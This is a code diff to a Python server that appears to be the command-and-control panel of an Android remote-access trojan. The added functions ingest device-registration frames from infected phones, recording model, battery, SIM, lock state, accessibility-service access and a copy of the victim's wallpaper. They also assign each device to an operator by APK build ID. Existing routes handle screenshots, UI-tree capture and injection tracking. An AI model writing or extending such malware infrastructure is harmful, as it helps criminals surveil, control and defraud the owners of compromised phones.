@@ -308,6 +308,96 @@ def _merge_diag_caps(rec, data):
                ','.join(sorted(data.keys()))), flush=True)
 
 
+def _merge_device_online(rec, data):
+    """Merge the native 2.1 client's registration frame into panel fields.
+
+    The source-built client reports ``action=deviceOnline`` and nests the
+    useful values under ``data.deviceInfo``.  The older lab agent reports the
+    same values as ``action=device_info``.  Keeping both forms in the same
+    internal ``caps.device_info`` record makes the API projection independent
+    of which client implementation connected.
+    """
+    if not isinstance(data, dict):
+        return
+    info = data.get('deviceInfo')
+    if isinstance(info, str) and info.lstrip().startswith('{'):
+        try:
+            info = json.loads(info)
+        except Exception:
+            info = None
+    if not isinstance(info, dict):
+        return
+
+    target = rec.setdefault('caps', {}).setdefault('device_info', {})
+    aliases = {
+        'brand': ('brand',),
+        'model': ('model',),
+        'android': ('android', 'androidVersion'),
+        'sdk': ('sdk', 'version'),
+        'region': ('region', 'area'),
+        'country': ('country', 'area'),
+        'network': ('network', 'netstate'),
+        'battery': ('battery',),
+        'charging': ('charging',),
+        'screen': ('screen',),
+        'screenWidth': ('screenWidth',),
+        'screenHeight': ('screenHeight',),
+        'lock': ('lock',),
+        'sim': ('sim',),
+        'appName': ('appName',),
+        'accName': ('accName',),
+        'apkVer': ('apkVer',),
+        'pkg': ('pkg', 'myPkg'),
+    }
+    for dst, sources in aliases.items():
+        for src in sources:
+            if src in info and info[src] not in (None, ''):
+                target[dst] = info[src]
+                break
+
+    if 'acc' in info:
+        target['acc'] = bool(info.get('acc'))
+        target['accessibility'] = bool(info.get('acc'))
+        granted = rec['caps'].setdefault('permissions', {}).setdefault('granted', [])
+        marker = 'BIND_ACCESSIBILITY_SERVICE'
+        if target['accessibility'] and marker not in granted:
+            granted.append(marker)
+        elif not target['accessibility'] and marker in granted:
+            granted.remove(marker)
+
+    wallpaper = info.get('wallpaper')
+    if isinstance(wallpaper, str) and wallpaper:
+        rec['wallpaper_b64'] = wallpaper
+        target['hasWallpaper'] = True
+    rec['appName'] = target.get('appName') or rec.get('appName') or ''
+    rec['last_device_online'] = int(time.time())
+    print('[server] deviceOnline merged %s/%s sdk=%s battery=%s app=%s wallpaper=%s' % (
+          target.get('brand', ''), target.get('model', ''), target.get('sdk', ''),
+          target.get('battery', ''), target.get('appName', ''),
+          'yes' if rec.get('wallpaper_b64') else 'no'), flush=True)
+
+
+def _wallpaper_bytes(rec):
+    """Decode the thumbnail carried by ``deviceOnline`` for the image route."""
+    raw = (rec or {}).get('wallpaper_b64')
+    if not isinstance(raw, str) or not raw:
+        return b'', ''
+    if raw.startswith('data:'):
+        header, _, raw = raw.partition(',')
+        hinted = header[5:].split(';', 1)[0]
+    else:
+        hinted = ''
+    try:
+        data = base64.b64decode(raw)
+    except Exception:
+        return b'', ''
+    if data.startswith(b'\x89PNG\r\n\x1a\n'):
+        return data, 'image/png'
+    if data.startswith(b'\xff\xd8\xff'):
+        return data, 'image/jpeg'
+    return (data, hinted) if data and hinted.startswith('image/') else (b'', '')
+
+
 def _decode_tree_payload(data):
     """把 2.1 客户端的 UI 树信封转成服务端内部节点结构。
 
@@ -410,6 +500,8 @@ async def on_device_frame(dev, text, ws):
                    ','.join(sorted(data.keys())) if isinstance(data, dict) else '-',
                    str(data)[:600]), flush=True)
             _merge_diag_caps(rec, data)
+        if action == 'deviceOnline':
+            _merge_device_online(rec, data)
         if action in ('device_info', 'permissions', 'adb_status'):
             rec['caps'][action] = data
         if action == 'screenshot':
@@ -922,6 +1014,17 @@ def _fresh(rec, timeout=90):
         return False
 
 
+def _resolve_device_owner(assigned_to, apk_id, users):
+    owner = str(assigned_to or '')
+    apk_id = str(apk_id or '')
+    if owner or not apk_id:
+        return owner
+    matches = [str(u.get('username') or '') for u in (users or [])
+               if str(u.get('apkId') or '') == apk_id]
+    named = [name for name in matches if name and name != 'admin']
+    return named[-1] if named else (matches[-1] if matches else '')
+
+
 def device_rows(src=None):
     """设备行投影：按原版面板读取的键名给出，供 /api/devices 列表与 /api/device 控制页共用。
     src：'primary' 只出主通道设备、'relay' 只出中继通道设备、None 全部（两套 C2 的设备不能混展示）。"""
@@ -945,6 +1048,7 @@ def device_rows(src=None):
                   and _fresh(r))
         first = r.get('first_seen') or r.get('last_seen') or 0
         granted = perms.get('granted') or []
+        owner = _resolve_device_owner(r.get('assigned_to'), r.get('apkid'), S.get('users'))
         out.append({
             'deviceId': d, 'displayId': d[:8], 'online': online,
             'apkId': r.get('apkid'), 'lastSeen': int(r.get('last_seen') or 0),
@@ -952,7 +1056,8 @@ def device_rows(src=None):
             'caps': list(caps.keys()), 'messages': len(r.get('msgs') or []),
             # 列表页直读列
             'brand': info.get('brand', ''), 'model': info.get('model', ''),
-            'androidVersion': info.get('android', ''), 'sdk': info.get('sdk', ''),
+            'androidVersion': info.get('android') or info.get('version') or info.get('sdk', ''),
+            'sdk': info.get('sdk') or info.get('version', ''),
             'region': info.get('region', ''), 'country': info.get('country', ''),
             'network': info.get('network', ''), 'battery': info.get('battery', 0),
             'charging': info.get('charging', False), 'screen': info.get('screen', ''),
@@ -964,7 +1069,8 @@ def device_rows(src=None):
             # 运营侧可写字段（备注/标记/置顶/分组）
             'note': (S.get('notes') or {}).get(d, ''),
             'mark': (S.get('marks') or {}).get(d),
-            'assigned_to': r.get('assigned_to') or '',
+            'owner': owner, 'assigned_to': owner,
+            'appName': r.get('appName') or info.get('appName', ''),
             'pinned': bool((S.get('pins') or {}).get(d)),
             'safeMode': False,
             'extra': {'deviceInfo': info, 'permissions': granted, 'adb': adb},
@@ -1172,9 +1278,14 @@ def mount_full_surface(app):
     async def wallpaper(request):
         if not _auth(request):
             return web.json_response({'error': 'unauthorized', 'ok': False}, status=401)
+        device_id = request.match_info.get('device_id', '')
+        raw, content_type = _wallpaper_bytes((STATE.get('devices') or {}).get(device_id))
+        if raw:
+            return web.Response(body=raw, content_type=content_type,
+                                headers={'Cache-Control': 'private, max-age=30'})
         out = api_impl.h_wallpaper({}, dict(request.query), 'admin',
-                                   request.match_info.get('device_id', ''))
-        return web.json_response(out)
+                                   device_id)
+        return web.json_response(out, status=404)
     app.router.add_get('/api/wallpaper/{device_id}', wallpaper)
     for act in ('inject', 'reset', 'skip'):
         path = '/api/device-inject-track/%s' % act
